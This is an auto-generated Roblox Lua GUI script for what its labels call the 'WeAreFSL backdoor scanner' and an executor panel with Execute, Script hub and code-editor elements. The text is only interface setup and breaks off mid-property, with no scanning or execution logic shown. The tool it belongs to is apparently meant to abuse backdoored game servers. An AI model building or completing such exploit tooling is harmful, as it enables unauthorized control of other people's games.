-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Scanner = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Epixlaz = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Scan = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Exec = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Execute = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Clear = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local R6 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Reset = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local ScriptHuB = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Epixlaz_2 = Instance.new("ImageLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Scripthub = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Polaria = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local TextButton_9 = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local TextButton_13 = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextButton_14 = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local TextButton_15 = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local TextButton_16 = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local TextButton_17 = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local TextButton_18 = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local TextButton_19 = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local TextButton_20 = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local TextButton_21 = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local TextButton_22 = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local TextButton_23 = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local TextButton_24 = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local Scroll = Instance.new("ScrollingFrame")
local Code = Instance.new("TextBox")
local Globals_ = Instance.new("TextLabel")
local Keywords_ = Instance.new("TextLabel")
local RemoteHighlight_ = Instance.new("TextLabel")
local Strings_ = Instance.new("TextLabel")
local Numbers_ = Instance.new("TextLabel")
local Comments_ = Instance.new("TextLabel")
local Custom_ = Instance.new("TextLabel")
local Tokens_ = Instance.new("TextLabel")
local Lines = Instance.new("TextLabel")
local LLine = Instance.new("Frame")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Scanner.Name = "Scanner"
Scanner.Parent = ScreenGui
Scanner.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Scanner.BorderColor3 = Color3.fromRGB(0, 0, 0)
Scanner.BorderSizePixel = 0
Scanner.Position = UDim2.new(0.329959512, 0, 0.332792222, 0)
Scanner.Size = UDim2.new(0, 335, 0, 205)

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = Scanner

Epixlaz.Name = "Epixlaz"
Epixlaz.Parent = Scanner
Epixlaz.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Epixlaz.BackgroundTransparency = 1.000
Epixlaz.BorderColor3 = Color3.fromRGB(0, 0, 0)
Epixlaz.BorderSizePixel = 0
Epixlaz.Position = UDim2.new(0.0389104597, 0, 0.0292682927, 3)
Epixlaz.Size = UDim2.new(0, 38, 0, 38)
Epixlaz.Image = "rbxassetid://109509735989414"

TextLabel.Parent = Epixlaz
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(1.15789473, 0, 0.157894731, 0)
TextLabel.Size = UDim2.new(0, 234, 0, 25)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "WeAreFSL backdoor scanner"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 16.000
TextLabel.TextWrapped = true

Scan.Name = "Scan"
Scan.Parent = Scanner
Scan.AnchorPoint = Vector2.new(1, 0.5)
Scan.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Scan.BorderColor3 = Color3.fromRGB(0, 0, 0)
Scan.BorderSizePixel = 0
Scan.Position = UDim2.new(0.869827151, 0, 0.523581326, 0)
Scan.Size = UDim2.new(0.362915963, 125, 0.483923823, -10)
Scan.Font = Enum.Font.GothamMedium
Scan.Text = "Scan for backdoors"
Scan.TextColor3 = Color3.fromRGB(235, 235, 235)
Scan.TextScaled = true
Scan.TextSize = 15.000
Scan.TextWrapped = true

UICorner_2.Parent = Scan

Exec.Name = "Exec"
Exec.Parent = ScreenGui
Exec.Active = true
Exec.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Exec.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exec.BorderSizePixel = 0
Exec.Position = UDim2.new(0.238866404, 0, 0.237012982, 0)
Exec.Selectable = true
Exec.Size = UDim2.new(0, 515, 0, 323)
Exec.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 15)
UICorner_3.Parent = Exec

Execute.Name = "Execute"
Execute.Parent = Exec
Execute.AnchorPoint = Vector2.new(1, 0.5)
Execute.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.984466016, 0, 0.312587678, 0)
Execute.Size = UDim2.new(-0.106796116, 125, 0.371728659, -10)
Execute.Font = Enum.Font.GothamMedium
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(235, 235, 235)
Execute.TextSize = 15.000

UICorner_4.Parent = Execute

Clear.Name = "Clear"
Clear.Parent = Exec
Clear.AnchorPoint = Vector2.new(1, 0.5)
Clear.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0.984466016, 0, 0.681008756, 0)
Clear.Size = UDim2.new(-0.106796116, 125, 0.371728659, -10)
Clear.Font = Enum.Font.GothamMedium
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(235, 235, 235)
Clear.TextSize = 15.000

UICorner_5.Parent = Clear

R6.Name = "R6"
R6.Parent = Exec
R6.AnchorPoint = Vector2.new(1, 0.5)
R6.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
R6.BorderColor3 = Color3.fromRGB(0, 0, 0)
R6.BorderSizePixel = 0
R6.Position = UDim2.new(0.603883505, 0, 0.936426699, 0)
R6.Size = UDim2.new(-0.0718446597, 125, 0.114762723, -10)
R6.Font = Enum.Font.GothamMedium
R6.Text = "R6"
R6.TextColor3 = Color3.fromRGB(235, 235, 235)
R6.TextSize = 15.000

UICorner_6.Parent = R6

Reset.Name = "Reset"
Reset.Parent = Exec
Reset.AnchorPoint = Vector2.new(1, 0.5)
Reset.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Reset.BorderColor3 = Color3.fromRGB(0, 0, 0)
Reset.BorderSizePixel = 0
Reset.Position = UDim2.new(0.796116531, 0, 0.936426699, 0)
Reset.Size = UDim2.new(-0.0718446597, 125, 0.114762723, -10)
Reset.Font = Enum.Font.GothamMedium
Reset.Text = "Reset"
Reset.TextColor3 = Color3.fromRGB(235, 235, 235)
Reset.TextSize = 15.000

UICorner_7.Parent = Reset

ScriptHuB.Name = "ScriptHuB"
ScriptHuB.Parent = Exec
ScriptHuB.AnchorPoint = Vector2.new(1, 0.5)
ScriptHuB.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ScriptHuB.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScriptHuB.BorderSizePixel = 0
ScriptHuB.Position = UDim2.new(0.984466016, 0, 0.936426699, 0)
ScriptHuB.Size = UDim2.new(-0.0718446597, 125, 0.114762723, -10)
ScriptHuB.Font = Enum.Font.GothamMedium
ScriptHuB.Text = "Script hub"
ScriptHuB.TextColor3 = Color3.fromRGB(235, 235, 235)
ScriptHuB.TextSize = 15.000

UICorner_8.Parent = ScriptHuB

Epixlaz_2.Name = "Epixlaz"
Epixlaz_2.Parent = Exec
Epixlaz_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Epixlaz_2.BackgroundTransparency = 1.000
Epixlaz_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Epixlaz_2.BorderSizePixel = 0
Epixlaz_2.Position = UDim2.new(0.0209999997, 0, 0, 3)
Epixlaz_2.Size = UDim2.new(0, 38, 0, 38)
Epixlaz_2.Image = "rbxassetid://109509735989414"

TextLabel_2.Parent = Epixlaz_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(3.10526323, 0, 0.0263157897, 0)
TextLabel_2.Size = UDim2.new(0, 243, 0, 37)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "WeAreFSL Internal"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

Scripthub.Name = "Scripthub"
Scripthub.Parent = Exec
Scripthub.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Scripthub.BorderColor3 = Color3.fromRGB(0, 0, 0)
Scripthub.BorderSizePixel = 0
Scripthub.Position = UDim2.new(1.03872681, 0, -0.00104043214, 0)
Scripthub.Size = UDim2.new(0, 276, 0, 323)
Scripthub.Visible = false

UICorner_9.CornerRadius = UDim.new(0, 15)
UICorner_9.Parent = Scripthub

TextLabel_3.Parent = Scripthub
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0760869533, 0, 0.0340557285, 0)
TextLabel_3.Size = UDim2.new(0, 234, 0, 30)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "Script Hub"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

ScrollingFrame.Parent = Scripthub
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.157894731, 0)
ScrollingFrame.Size = UDim2.new(0, 276, 0, 272)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 3, 0)

Polaria.Name = "Polaria"
Polaria.Parent = ScrollingFrame
Polaria.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Polaria.BorderColor3 = Color3.fromRGB(0, 0, 0)
Polaria.BorderSizePixel = 0
Polaria.Position = UDim2.new(0.0760869533, 0, 0.0073529412, 0)
Polaria.Size = UDim2.new(0, 234, 0, 27)
Polaria.Font = Enum.Font.Gotham
Polaria.Text = " Polaria"
Polaria.TextColor3 = Color3.fromRGB(255, 255, 255)
Polaria.TextScaled = true
Polaria.TextSize = 14.000
Polaria.TextWrapped = true

UICorner_10.Parent = Polaria

TextButton.Parent = ScrollingFrame
TextButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0759999976, 0, 0.0480000004, 0)
TextButton.Size = UDim2.new(0, 234, 0, 27)
TextButton.Font = Enum.Font.Gotham
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_11.Parent = TextButton

TextButton_2.Parent = ScrollingFrame
TextButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.0759999976, 0, 0.0869999975, 0)
TextButton_2.Size = UDim2.new(0, 234, 0, 27)
TextButton_2.Font = Enum.Font.Gotham
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_12.Parent = TextButton_2

TextButton_3.Parent = ScrollingFrame
TextButton_3.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0759999976, 0, 0.126000002, 0)
TextButton_3.Size = UDim2.new(0, 234, 0, 27)
TextButton_3.Font = Enum.Font.Gotham
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

UICorner_13.Parent = TextButton_3

TextButton_4.Parent = ScrollingFrame
TextButton_4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0759999976, 0, 0.165000007, 0)
TextButton_4.Size = UDim2.new(0, 234, 0, 27)
TextButton_4.Font = Enum.Font.Gotham
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

UICorner_14.Parent = TextButton_4

TextButton_5.Parent = ScrollingFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.0759999976, 0, 0.204999998, 0)
TextButton_5.Size = UDim2.new(0, 234, 0, 27)
TextButton_5.Font = Enum.Font.Gotham
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true

UICorner_15.Parent = TextButton_5

TextButton_6.Parent = ScrollingFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Position = UDim2.new(0.0759999976, 0, 0.245000005, 0)
TextButton_6.Size = UDim2.new(0, 234, 0, 27)
TextButton_6.Font = Enum.Font.Gotham
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true

UICorner_16.Parent = TextButton_6

TextButton_7.Parent = ScrollingFrame
TextButton_7.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BorderSizePixel = 0
TextButton_7.Position = UDim2.new(0.0759999976, 0, 0.284999996, 0)
TextButton_7.Size = UDim2.new(0, 234, 0, 27)
TextButton_7.Font = Enum.Font.Gotham
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true

UICorner_17.Parent = TextButton_7

TextButton_8.Parent = ScrollingFrame
TextButton_8.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BorderSizePixel = 0
TextButton_8.Position = UDim2.new(0.0759999976, 0, 0.324999988, 0)
TextButton_8.Size = UDim2.new(0, 234, 0, 27)
TextButton_8.Font = Enum.Font.Gotham
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true

UICorner_18.Parent = TextButton_8

TextButton_9.Parent = ScrollingFrame
TextButton_9.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BorderSizePixel = 0
TextButton_9.Position = UDim2.new(0.0759999976, 0, 0.36500001, 0)
TextButton_9.Size = UDim2.new(0, 234, 0, 27)
TextButton_9.Font = Enum.Font.Gotham
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextScaled = true
TextButton_9.TextSize = 14.000
TextButton_9.TextWrapped = true

UICorner_19.Parent = TextButton_9

TextButton_10.Parent = ScrollingFrame
TextButton_10.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.BorderSizePixel = 0
TextButton_10.Position = UDim2.new(0.0759999976, 0, 0.405000001, 0)
TextButton_10.Size = UDim2.new(0, 234, 0, 27)
TextButton_10.Font = Enum.Font.Gotham
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextScaled = true
TextButton_10.TextSize = 14.000
TextButton_10.TextWrapped = true

UICorner_20.Parent = TextButton_10

TextButton_11.Parent = ScrollingFrame
TextButton_11.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.BorderSizePixel = 0
TextButton_11.Position = UDim2.new(0.0759999976, 0, 0.444999993, 0)
TextButton_11.Size = UDim2.new(0, 234, 0, 27)
TextButton_11.Font = Enum.Font.Gotham
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextScaled = true
TextButton_11.TextSize = 14.000
TextButton_11.TextWrapped = true

UICorner_21.Parent = TextButton_11

TextButton_12.Parent = ScrollingFrame
TextButton_12.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.BorderSizePixel = 0
TextButton_12.Position = UDim2.new(0.0759999976, 0, 0.485000014, 0)
TextButton_12.Size = UDim2.new(0, 234, 0, 27)
TextButton_12.Font = Enum.Font.Gotham
TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.TextScaled = true
TextButton_12.TextSize = 14.000
TextButton_12.TextWrapped = true

UICorner_22.Parent = TextButton_12

TextButton_13.Parent = ScrollingFrame
TextButton_13.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.BorderSizePixel = 0
TextButton_13.Position = UDim2.new(0.0759999976, 0, 0.524999976, 0)
TextButton_13.Size = UDim2.new(0, 234, 0, 27)
TextButton_13.Font = Enum.Font.Gotham
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextScaled = true
TextButton_13.TextSize = 14.000
TextButton_13.TextWrapped = true

UICorner_23.Parent = TextButton_13

TextButton_14.Parent = ScrollingFrame
TextButton_14.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.BorderSizePixel = 0
TextButton_14.Position = UDim2.new(0.0759999976, 0, 0.564999998, 0)
TextButton_14.Size = UDim2.new(0, 234, 0, 27)
TextButton_14.Font = Enum.Font.Gotham
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextScaled = true
TextButton_14.TextSize = 14.000
TextButton_14.TextWrapped = true

UICorner_24.Parent = TextButton_14

TextButton_15.Parent = ScrollingFrame
TextButton_15.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.BorderSizePixel = 0
TextButton_15.Position = UDim2.new(0.0759999976, 0, 0.605000019, 0)
TextButton_15.Size = UDim2.new(0, 234, 0, 27)
TextButton_15.Font = Enum.Font.Gotham
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextScaled = true
TextButton_15.TextSize = 14.000
TextButton_15.TextWrapped = true

UICorner_25.Parent = TextButton_15

TextButton_16.Parent = ScrollingFrame
TextButton_16.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.BorderSizePixel = 0
TextButton_16.Position = UDim2.new(0.0759999976, 0, 0.644999981, 0)
TextButton_16.Size = UDim2.new(0, 234, 0, 27)
TextButton_16.Font = Enum.Font.Gotham
TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.TextScaled = true
TextButton_16.TextSize = 14.000
TextButton_16.TextWrapped = true

UICorner_26.Parent = TextButton_16

TextButton_17.Parent = ScrollingFrame
TextButton_17.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_17.BorderSizePixel = 0
TextButton_17.Position = UDim2.new(0.0759999976, 0, 0.685000002, 0)
TextButton_17.Size = UDim2.new(0, 234, 0, 27)
TextButton_17.Font = Enum.Font.Gotham
TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.TextScaled = true
TextButton_17.TextSize = 14.000
TextButton_17.TextWrapped = true

UICorner_27.Parent = TextButton_17

TextButton_18.Parent = ScrollingFrame
TextButton_18.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_18.BorderSizePixel = 0
TextButton_18.Position = UDim2.new(0.0759999976, 0, 0.725000024, 0)
TextButton_18.Size = UDim2.new(0, 234, 0, 27)
TextButton_18.Font = Enum.Font.Gotham
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextScaled = true
TextButton_18.TextSize = 14.000
TextButton_18.TextWrapped = true

UICorner_28.Parent = TextButton_18

TextButton_19.Parent = ScrollingFrame
TextButton_19.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_19.BorderSizePixel = 0
TextButton_19.Position = UDim2.new(0.0759999976, 0, 0.764999986, 0)
TextButton_19.Size = UDim2.new(0, 234, 0, 27)
TextButton_19.Font = Enum.Font.Gotham
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextScaled = true
TextButton_19.TextSize = 14.000
TextButton_19.TextWrapped = true

UICorner_29.Parent = TextButton_19

TextButton_20.Parent = ScrollingFrame
TextButton_20.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_20.BorderSizePixel = 0
TextButton_20.Position = UDim2.new(0.0759999976, 0, 0.805000007, 0)
TextButton_20.Size = UDim2.new(0, 234, 0, 27)
TextButton_20.Font = Enum.Font.Gotham
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextScaled = true
TextButton_20.TextSize = 14.000
TextButton_20.TextWrapped = true

UICorner_30.Parent = TextButton_20

TextButton_21.Parent = ScrollingFrame
TextButton_21.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_21.BorderSizePixel = 0
TextButton_21.Position = UDim2.new(0.0759999976, 0, 0.845000029, 0)
TextButton_21.Size = UDim2.new(0, 234, 0, 27)
TextButton_21.Font = Enum.Font.Gotham
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextScaled = true
TextButton_21.TextSize = 14.000
TextButton_21.TextWrapped = true

UICorner_31.Parent = TextButton_21

TextButton_22.Parent = ScrollingFrame
TextButton_22.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_22.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_22.BorderSizePixel = 0
TextButton_22.Position = UDim2.new(0.0759999976, 0, 0.88499999, 0)
TextButton_22.Size = UDim2.new(0, 234, 0, 27)
TextButton_22.Font = Enum.Font.Gotham
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextScaled = true
TextButton_22.TextSize = 14.000
TextButton_22.TextWrapped = true

UICorner_32.Parent = TextButton_22

TextButton_23.Parent = ScrollingFrame
TextButton_23.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_23.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_23.BorderSizePixel = 0
TextButton_23.Position = UDim2.new(0.0759999976, 0, 0.925000012, 0)
TextButton_23.Size = UDim2.new(0, 234, 0, 27)
TextButton_23.Font = Enum.Font.Gotham
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextScaled = true
TextButton_23.TextSize = 14.000
TextButton_23.TextWrapped = true

UICorner_33.Parent = TextButton_23

TextButton_24.Parent = ScrollingFrame
TextButton_24.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_24.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_24.BorderSizePixel = 0
TextButton_24.Position = UDim2.new(0.0759999976, 0, 0.964999974, 0)
TextButton_24.Size = UDim2.new(0, 234, 0, 27)
TextButton_24.Font = Enum.Font.Gotham
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextScaled = true
TextButton_24.TextSize = 14.000
TextButton_24.TextWrapped = true

UICorner_34.Parent = TextButton_24

Scroll.Name = "Scroll"
Scroll.Parent = Exec
Scroll.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Scroll.BackgroundTransparency = 0.500
Scroll.BorderColor3 = Color3.fromRGB(27, 42, 53)
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0.0299280845, 0, 0.142203361, 0)
Scroll.Size = UDim2.new(0.8056162, 0, 0.712244868, 0)
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.ScrollBarThickness = 6

Code.Name = "Code"
Code.Parent = Scroll
Code.AnchorPoint = Vector2.new(1, 0)
Code.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Code.BackgroundTransparency = 1.000
Code.BorderColor3 = Color3.fromRGB(27, 42, 53)
Code.BorderSizePixel = 0
Code.Position = UDim2.new(0.979098141, 0, 0, 0)
Code.Selectable = false
Code.Size = UDim2.new(0.935374141, 0, 1, 0)
Code.ClearTextOnFocus = false
Code.Font = Enum.Font.Code
Code.MultiLine = true
Code.Text = ""
Code.TextColor3 = Color3.fromRGB(255, 255, 255)
Code.TextSize = 14.000
Code.TextXAlignment = Enum.TextXAlignment.Left
Code.TextYAlignment = Enum.TextYAlignment.Top

Globals_.Name = "Globals_"
Globals_.Parent = Code
Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals_.BackgroundTransparency = 1.000
Globals_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Globals_.BorderSizePixel = 0
Globals_.Size = UDim2.new(1, 0, 1, 0)
Globals_.ZIndex = 2
Globals_.Font = Enum.Font.Code
Globals_.Text = ""
Globals_.TextColor3 = Color3.fromRGB(86, 156, 214)
Globals_.TextSize = 14.000
Globals_.TextXAlignment = Enum.TextXAlignment.Left
Globals_.TextYAlignment = Enum.TextYAlignment.Top

Keywords_.Name = "Keywords_"
Keywords_.Parent = Code
Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords_.BackgroundTransparency = 1.000
Keywords_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Keywords_.BorderSizePixel = 0
Keywords_.Size = UDim2.new(0.999999881, 0, 1, 0)
Keywords_.ZIndex = 2
Keywords_.Font = Enum.Font.Code
Keywords_.Text = ""
Keywords_.TextColor3 = Color3.fromRGB(86, 156, 214)
Keywords_.TextSize = 14.000
Keywords_.TextXAlignment = Enum.TextXAlignment.Left
Keywords_.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight_.Name = "RemoteHighlight_"
RemoteHighlight_.Parent = Code
RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight_.BackgroundTransparency = 1.000
RemoteHighlight_.BorderColor3 = Color3.fromRGB(27, 42, 53)
RemoteHighlight_.BorderSizePixel = 0
